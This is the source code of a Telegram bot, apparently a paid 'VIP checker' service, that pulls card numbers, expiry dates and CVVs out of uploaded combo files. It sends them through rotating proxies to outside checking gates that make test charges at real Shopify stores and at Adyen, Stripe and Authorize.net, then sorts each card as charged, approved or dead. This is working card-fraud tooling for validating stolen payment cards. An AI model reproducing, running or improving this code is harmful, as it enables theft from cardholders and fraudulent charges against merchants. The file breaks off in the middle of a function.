import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import io
import sys
import logging
from datetime import datetime, timedelta
from urllib.parse import quote
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes, Defaults
from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
from telegram.constants import ParseMode

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, mark_user_joined
)

BUTTON_REGISTRY = {}
_original_inline_keyboard_button = telegram.InlineKeyboardButton

def CustomInlineKeyboardButton(*args, **kwargs):
    style = kwargs.pop('style', None)
    icon_custom_emoji_id = kwargs.pop('icon_custom_emoji_id', None)
    btn = _original_inline_keyboard_button(*args, **kwargs)
    if style or icon_custom_emoji_id:
        BUTTON_REGISTRY[id(btn)] = {'style': style, 'icon_custom_emoji_id': icon_custom_emoji_id}
    return btn

telegram.InlineKeyboardButton = CustomInlineKeyboardButton

_original_to_dict = _original_inline_keyboard_button.to_dict
def _patched_to_dict(self, *args, **kwargs):
    d = _original_to_dict(self, *args, **kwargs)
    extra = BUTTON_REGISTRY.pop(id(self), None)
    if extra:
        if extra.get('style'): d['style'] = extra['style']
        if extra.get('icon_custom_emoji_id'): d['icon_custom_emoji_id'] = extra['icon_custom_emoji_id']
    return d
_original_inline_keyboard_button.to_dict = _patched_to_dict

logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("VIP_BOT_V2")

BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808,8170592405").split(",") if x.strip()]

JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
HITS_GROUP_LINK = os.getenv("HITS_GROUP_LINK", "").strip()

def get_valid_target(link, chat_id):
    l = str(link).strip()
    c = str(chat_id).strip()
    if "t.me/" in l and "+" not in l and "joinchat" not in l:
        uname = l.split("t.me/")[-1].split("/")[0].split("?")[0]
        return f"@{uname}"
    if l.startswith("@"): return l
    if c and c not in ["0", "", "none", "None"]:
        if c.isdigit(): c = f"-100{c}"
        try: return int(c)
        except ValueError: return c
    return None

JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)

SHOPIFY_API_URL_1 = 'https://gates.valyrian.cc/autoshopify/curl/check'
ADYEN_API_URL = 'https://gates.valyrian.cc/triumph/check'
STRIPE_API_URL = 'https://gates.valyrian.cc/stripe1/check'
AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

# ==================== PERFORMANCE V2 SETTINGS ====================
CPM_TARGET = int(os.getenv("CPM_TARGET", "80"))
MIN_DELAY = float(os.getenv("MIN_DELAY", "0.05"))
MAX_DELAY = float(os.getenv("MAX_DELAY", "2.0"))

WORKERS_CONFIG = {
    "Shopify": lambda: random.randint(25, 50),
    "Adyen": 35,
    "Stripe": 30,
    "AuthNet": 1
}

API_TIMEOUT = 35
HIT_DELAY = 0.3
RETRY_ATTEMPTS = 3

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 5
_CIRCUIT_BREAKERS = {}
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

_CHECKED_USERS_PXY = set()
_CHECKED_USERS_GATES = set()
_CHECK_PXY_COOLDOWN = 3600
_CHECK_GATES_COOLDOWN = 1800
_CHECK_PXY_TIME = {}
_CHECK_GATES_TIME = {}

_USER_NAMES = {}
USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}

TEST_CARD = "4111111111111111|12|2027|123"

def get_flag_emoji(country_code, fallback="🏳️"):
    if not country_code: return fallback
    c = str(country_code).upper().strip()
    if len(c) == 3:
        c = ISO3_TO_ISO2.get(c, c[:2])
    if c in ["-", "UNKNOWN", ""]: return fallback
    if len(c) != 2: return fallback
    try:
        return chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397)
    except Exception:
        return fallback

WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"

ANIME_GIFS = [
    "https://i.giphy.com/X3Yj4X96MK4wM.gif",
    "https://i.giphy.com/3rVgN21VK2DuU.gif",
    "https://i.giphy.com/MeE378J7w7bTq.gif",
    "https://i.giphy.com/vlnZpsw8S_Z04.gif",
    "https://i.giphy.com/3o7abIile68G58510k.gif",
    "https://i.giphy.com/13m24iFmhomZi0.gif",
    "https://i.giphy.com/l3vR1603ssT69vWb6.gif",
    "https://i.giphy.com/XjY7D2H47Y0j6.gif",
    "https://i.giphy.com/20K8866h4693G.gif",
    "https://i.giphy.com/d3mlE7uhRoVX2Im4.gif"
]

PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

_GIF_FILE_IDS = {}
_system_locks = {}
_BIN_CACHE = {}

def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Exception in update: {context.error}")

def is_valid_url(link):
    return link and str(link).strip().startswith("http")

async def fetch_gif_bytes(url):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {"User-Agent": "Mozilla/5.0"}
            async with session.get(url, headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    bio = io.BytesIO(await resp.read())
                    bio.name = "animation.gif"
                    return bio
    except Exception as e: logger.error(f"Failed to fetch GIF: {e}")
    return None

async def send_forced_gif(target_func, text, markup, url):
    media_to_send = _GIF_FILE_IDS.get(url, url)
    for retry in range(4):
        try:
            msg = await target_func(
                animation=media_to_send, caption=text, reply_markup=markup,
                parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
            )
            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
                _GIF_FILE_IDS[url] = msg.animation.file_id
            return msg
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.5)
        except Exception:
            break
    try:
        gif_io = await fetch_gif_bytes(url)
        if gif_io:
            for retry in range(3):
                try:
                    msg = await target_func(
                        animation=gif_io, caption=text, reply_markup=markup,
                        parse_mode=ParseMode.HTML, read_timeout=60, write_timeout=60
                    )
                    if getattr(msg, 'animation', None):
                        _GIF_FILE_IDS[url] = msg.animation.file_id
                    return msg
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 0.5)
                except Exception:
                    break
    except Exception: pass
    try:
        if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
            return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
    except: pass
    return None

async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None
    url = specific_gif or random.choice(ANIME_GIFS)
    if use_gif or specific_gif: return await send_forced_gif(target.reply_animation, text, markup, url)
    for retry in range(3):
        try: return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 0.5)
        except Exception: return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    for retry in range(3):
        try:
            if msg.animation or msg.photo or msg.video or msg.document:
                return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
            return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 0.5)
        except Exception:
            return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    url = specific_gif or random.choice(ANIME_GIFS)
    async def _bot_send_anim(**kwargs): return await bot.send_animation(chat_id=chat_id, **kwargs)
    if use_gif or specific_gif: return await send_forced_gif(_bot_send_anim, text, markup, url)
    for retry in range(3):
        try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 0.5)
        except Exception: return None

async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r', encoding='utf-8') as f:
                    c = await f.read()
                    if c: return json.loads(c)
            except Exception: pass
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        try:
            async with aiofiles.open(KEYS_FILE, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(keys_data, indent=4))
        except Exception: pass

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 40000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(
            limit=100, limit_per_host=30, ssl=False,
            enable_cleanup_closed=True, force_close=False,
            ttl_dns_cache=600, use_dns_cache=True, family=0
        )
        timeout = aiohttp.ClientTimeout(total=60, connect=15, sock_read=30)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(
            connector=connector, timeout=timeout,
            headers={"Accept": "application/json", "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}
        )
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except Exception: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\:]+(\d{2})[\s|/\:]+(\d{2,4})[\s|/\:]+(\d{3,4})', text):
        y = '20' + y if len(y) == 2 else y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\:]+(\d{2})[\s|/\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\:]+(\d{2})[\s|/\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    if re.match(r'^socks', proxy, re.IGNORECASE):
        return None
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
    if 'socks' in pt:
        return None
    if re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy):
        u, pw, h, p = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
    elif re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
        u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups()
        u = pw = ''
    else:
        return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

_CACHED_SHOPIFY_SITES = []
_LAST_SITES_FETCH = 0

async def get_shopify_sites():
    global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SHOPIFY_SITES and (now - _LAST_SITES_FETCH < 600):
        return _CACHED_SHOPIFY_SITES
    if os.path.exists('sites.txt'):
        try:
            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SHOPIFY_SITES = list(dict.fromkeys([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).splitlines() if l.strip()]))
                if _CACHED_SHOPIFY_SITES:
                    _LAST_SITES_FETCH = now
                    return _CACHED_SHOPIFY_SITES
        except Exception: pass
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
                if r.status == 200:
                    _CACHED_SHOPIFY_SITES = list(dict.fromkeys([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).splitlines() if l.strip()]))
                    _LAST_SITES_FETCH = now
    except Exception: pass
    if not _CACHED_SHOPIFY_SITES:
        _CACHED_SHOPIFY_SITES = [
            "touch-of-finland.myshopify.com",
            "huckberry.myshopify.com",
            "death-wish-coffee.myshopify.com",
            "gymshark.myshopify.com"
        ]
    return _CACHED_SHOPIFY_SITES

async def is_user_joined(uid, bot):
    targets = [t for t in [JOIN_CHANNEL_TARGET, JOIN_GROUP_TARGET] if t]
    if not targets: return True
    for target in targets:
        try:
            cid = None
            try:
                cid = int(target)
            except (ValueError, TypeError):
                cid = target
            if cid is None:
                continue
            member = await bot.get_chat_member(chat_id=cid, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']:
                return False
        except Exception:
            continue
    return True

async def send_welcome_menu(update_or_bot, uid, plan, limit):
    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /chkpxy - {sf('Test Proxies')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM V2')} {CE_CROWN} ━━━</b>

<b>{CE_TOP} {sf('Checker Engine')}:</b>
 ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>

<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
 ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
 ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
 ├ {CE_CANDLE} /chkpxy - {sf('Test Proxies')}
 ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}

<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
 ├ {CE_CANDLE} /info - {sf('Profile Info')}
 ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
 ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
 ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}

<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
    kb = [
        [InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"),
         InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]
    ]
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162"), InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    elif is_valid_url(JOIN_CHANNEL_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    elif is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    if isinstance(update_or_bot, Update):
        await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
    else:
        await styled_send(update_or_bot, uid, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        _JOIN_CACHE[uid] = now
        return True
    kb = []
    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    if kb: kb.append([InlineKeyboardButton('Verify', callback_data="check_joined", style="success", icon_custom_emoji_id="5445189224682779974")])
    await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
    return False

def clean_bin_data(data):
    country_name = str(data.get("country", "-")).upper().strip()
    country_code = str(data.get("country_code", data.get("country_iso", data.get("code", "")))).upper().strip()
    if not country_code and country_name != "-":
        country_code = COUNTRY_NAME_TO_CODE.get(country_name, "")
    if len(country_code) == 3:
        country_code = ISO3_TO_ISO2.get(country_code, country_code[:2])
    flag = data.get("flag", "")
    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
        flag = get_flag_emoji(country_code)
    return {
        "brand": str(data.get("brand", "-")).upper().strip(),
        "type": str(data.get("type", "-")).upper().strip(),
        "level": str(data.get("level", "-")).upper().strip(),
        "bank": str(data.get("bank", "-")).upper().strip(),
        "country": country_name,
        "country_code": country_code,
        "flag": flag
    }

async def get_bin_info(bin_code, session=None):
    b6 = str(bin_code)[:6]
    if b6 in _BIN_CACHE:
        return _BIN_CACHE[b6]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "application/json"
    }
    try:
        url1 = f"https://bins.antipublic.cc/bins/{b6}"
        async def fetch1(s):
            async with s.get(url1, headers=headers, timeout=5) as r:
                if r.status == 200:
                    data = await r.json()
                    if data and isinstance(data, dict): return data
                return None
        if session and not session.closed:
            res = await fetch1(session)
        else:
            async with aiohttp.ClientSession() as tmp_session:
                res = await fetch1(tmp_session)
        if res and "country" in res:
            parsed = clean_bin_data({
                "brand": res.get("brand", "-"),
                "type": res.get("type", "-"),
                "level": res.get("level", "-"),
                "bank": res.get("bank", "-"),
                "country": res.get("country_name", res.get("country", "-")),
                "country_code": res.get("country_flag", res.get("country_code", res.get("country_iso", ""))),
                "flag": res.get("flag", "")
            })
            _BIN_CACHE[b6] = parsed
            return parsed
    except Exception: pass
    try:
        url2 = f"https://data.handyapi.com/bin/{b6}"
        async def fetch2(s):
            async with s.get(url2, headers=headers, timeout=5) as r:
                if r.status == 200: return await r.json()
                return None
        if session and not session.closed:
            res2 = await fetch2(session)
        else:
            async with aiohttp.ClientSession() as tmp_session:
                res2 = await fetch2(tmp_session)
        if res2 and res2.get("Status") == "SUCCESS":
            country_obj = res2.get("Country") or {}
            bank_obj = res2.get("Bank") or {}
            parsed = clean_bin_data({
                "brand": res2.get("Scheme", "-"),
                "type": res2.get("Type", "-"),
                "level": res2.get("CardTier", "-"),
                "bank": bank_obj.get("Name", "-"),
                "country": country_obj.get("Name", "-"),
                "country_code": country_obj.get("A2", "") or country_obj.get("A3", ""),
                "flag": ""
            })
            _BIN_CACHE[b6] = parsed
            return parsed
    except Exception: pass
    try:
        url3 = f"https://lookup.binlist.net/{b6}"
        async def fetch3(s):
            async with s.get(url3, headers=headers, timeout=5) as r:
                if r.status == 200: return await r.json()
                return None
        if session and not session.closed:
            res3 = await fetch3(session)
        else:
            async with aiohttp.ClientSession() as tmp_session:
                res3 = await fetch3(tmp_session)
        if res3:
            country_obj = res3.get("country") or {}
            bank_obj = res3.get("bank") or {}
            parsed = clean_bin_data({
                "brand": res3.get("scheme", "-"),
                "type": res3.get("type", "-"),
                "level": res3.get("brand", "-"),
                "bank": bank_obj.get("name", "-"),
                "country": country_obj.get("name", "-"),
                "country_code": country_obj.get("alpha2", ""),
                "flag": ""
            })
            _BIN_CACHE[b6] = parsed
            return parsed
    except Exception: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}

# ==================== API HELPER FUNCTIONS V2 ====================

async def _api_request_with_retry(session, url, proxy_url=None, headers=None, max_retries=3, timeout=API_TIMEOUT):
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    if headers:
        default_headers.update(headers)
    last_error = None
    for attempt in range(max_retries):
        try:
            async with session.get(url, headers=default_headers, proxy=proxy_url, timeout=timeout, ssl=False) as resp:
                text = await resp.text()
                return resp.status, text
        except asyncio.TimeoutError:
            last_error = "Timeout"
            if attempt < max_retries - 1:
                wait_time = 0.3 * (2 ** attempt)
                await asyncio.sleep(wait_time)
            continue
        except aiohttp.ClientProxyConnectionError:
            last_error = "Proxy Connection Failed"
            if attempt < max_retries - 1:
                await asyncio.sleep(0.2)
            continue
        except aiohttp.ClientHttpProxyError as e:
            status = getattr(e, 'status', '?')
            last_error = f"Proxy Error {status}"
            break
        except Exception as e:
            last_error = str(e)[:50]
            if attempt < max_retries - 1:
                await asyncio.sleep(0.2)
            continue
    return 0, f"Request Failed: {last_error}"

def _parse_api_response(text_data):
    gt = "Unknown"
    pr = None
    rm = text_data.strip()
    api_status = None
    try:
        rj = json.loads(text_data)
        rm = str(rj.get('response_msg',
                 rj.get('result',
                 rj.get('Response',
                 rj.get('message',
                 rj.get('error',
                 rj.get('msg',
                 rj.get('status',
                 rj.get('data', ''))))))))).strip()
        gt = rj.get('Gateway', rj.get('gateway', 'Unknown'))
        for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged', 'charge', 'total']:
            if k in rj and rj[k] is not None and str(rj[k]).strip():
                pr = str(rj[k]).strip()
                break
        api_status = str(rj.get('status', rj.get('Status', ''))).lower().strip()
    except Exception:
        pass
    return rm, gt, pr, api_status

def _check_cloudflare_block(text_data):
    if not text_data: return False
    lower = text_data.lower()
    if "<html" in lower and any(k in lower for k in ["cloudflare", "just a moment", "challenge", "captcha", "ddos"]):
        return True
    return False

def _determine_status(clean_rm, api_status, gateway_name, price):
    if api_status:
        if api_status in ['charged', 'approved', 'success', 'succeeded', 'completed', 'captured', 'paid', 'authorised', 'authorized']:
            if any(k in clean_rm for k in ['not charged', 'not authorised', 'declined', 'refused']):
                return 'Dead', price or '-'
            return 'Charged', price or '-'
        if api_status in ['declined', 'dead', 'rejected', 'denied', 'failed', 'refused']:
            return 'Dead', price or '-'
        if api_status in ['insufficient', 'insufficient_funds', 'nsf']:
            return 'Insufficient', price or '-'
    charged_kw = ['charged', 'payment succeeded', 'success', 'captured', 'approved', 'completed',
                  'authorised', 'authorized', 'payment completed', 'transaction completed', 'accepted',
                  'payment successful', 'charge complete', 'settled', 'payment confirmed', 'order confirmed', 'paid']
    if any(k in clean_rm for k in charged_kw):
        if any(k in clean_rm for k in ['not charged', 'not authorised', 'declined', 'refused']):
            return 'Dead', price or '-'
        return 'Charged', price or '-'
    approved_kw = ['cvv match', 'avs', 'security code match', 'cvv correct', 'invalid_cvv',
                   'incorrect_cvv', 'cvv2', 'cid', 'match', '3d authenticated', 'challenge completed']
    if any(k in clean_rm for k in approved_kw):
        return 'Approved', price or '-'
    insufficient_kw = ['insufficient funds', 'not enough funds', 'low balance', 'limit exceeded',
                       'over limit', 'nsf', 'not sufficient', 'no money', 'low funds']
    if any(k in clean_rm for k in insufficient_kw):
        return 'Insufficient', price or '-'
    dead_kw = ['declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud', 'expired',
               'invalid number', 'invalid card', 'call issuer', 'not permitted', 'not allowed',
               'restricted', 'refused', 'authentication_required', '3d secure', 'otp required',
               'incorrect', 'wrong', 'denied', 'rejected', 'blocked', 'banned', 'unauthorized',
               'forbidden', 'invalid cvv', 'invalid expiry', 'acquirer fraud', 'risk', 'not supported',
               'unsupported', 'cancelled', 'canceled', 'abandoned', 'processing error', 'card_declined',
               'processor_declined', 'issuer_declined']
    if any(k in clean_rm for k in dead_kw):
        return 'Dead', price or '-'
    site_error_kw = ['site error', 'gateway error', 'not shopify', 'cart failed', 'step 0', 'step 1',
                     'session error', 'max retries', 'requires login', 'login required', 'format error',
                     'timeout', 'connection', 'unreachable', 'server error', 'internal error',
                     'service unavailable', 'bad gateway', 'empty response', 'no response', 'parse error',
                     'invalid request', 'missing parameter', 'rate limit', 'too many requests']
    if any(k in clean_rm for k in site_error_kw):
        return 'Site Error', None
    if len(clean_rm) < 3:
        return 'Site Error', None
    return 'Dead', price or '-'

async def check_shopify_api(api_url, card, site, proxy, session):
    try:
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
        card = str(card).strip()
        card_encoded = quote(card)
        site_param = site.strip()
        if not site_param.startswith("http"):
            site_param = f"https://{site_param}"
        site_encoded = quote(site_param)
        proxy_encoded = quote(proxy_str) if proxy_str else ""
        req_url = f"{api_url}?site={site_encoded}&cc={card_encoded}"
        if proxy_encoded:
            req_url += f"&proxy={proxy_encoded}"
        status_code, text_data = await _api_request_with_retry(
            session, req_url, proxy_str, max_retries=2, timeout=API_TIMEOUT
        )
        if status_code == 0:
            return {'status': 'Site Error', 'message': text_data, 'card': card}
        if status_code in [404, 504, 505, 500, 501, 502, 503, 429, 403, 401, 400, 422]:
            return {'status': 'Site Error', 'message': f'HTTP {status_code}', 'card': card}
        if _check_cloudflare_block(text_data):
            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
        if not text_data or not text_data.strip():
            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
        rm, gt, pr, api_status = _parse_api_response(text_data)
        clean_rm = unsf(rm).lower().strip()
        status, price = _determine_status(clean_rm, api_status, gt, pr)
        if status == 'Site Error':
            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
        return {'status': status, 'message': rm, 'card': card, 'gateway': gt, 'price': price or '-'}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}

async def check_adyen_api(card, proxy, session):
    try:
        proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
        card = str(card).strip()
        req_url = f"{ADYEN_API_URL}?card={quote(card)}"
        status_code, text_data = await _api_request_with_retry(
            session, req_url, proxy_url, max_retries=RETRY_ATTEMPTS, timeout=API_TIMEOUT
        )
        if status_code == 0:
            return {'status': 'Site Error', 'message': text_data, 'card': card}
        if status_code in [500, 502, 503, 504]:
            return {'status': 'Site Error', 'message': f'Server Error {status_code}', 'card': card}
        if _check_cloudflare_block(text_data):
            return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
        if not text_data or not text_data.strip():
            return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
        rm, gt, pr, api_status = _parse_api_response(text_data)
        clean_rm = unsf(rm).lower().strip()
        if 'internal error' in clean_rm or 'internal server error' in clean_rm:
            return {'status': 'Site Error', 'message': rm, 'card': card}
        status, price = _determine_status(clean_rm, api_status, gt or 'Adyen', pr)
        if status == 'Site Error':
            return {'status': 'Site Error', 'message': rm or 'Unknown Error', 'card': card}
        return {'status': status, 'message': rm, 'card': card, 'gateway': gt or 'Adyen', 'price': price or '-'}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}

STRIPE_PRICE = "$1.00"

async def check_stripe_api(card, proxy, session):
    try:
        proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
        card = str(card).strip()
        req_url = f"{STRIPE_API_URL}?card={quote(card)}"
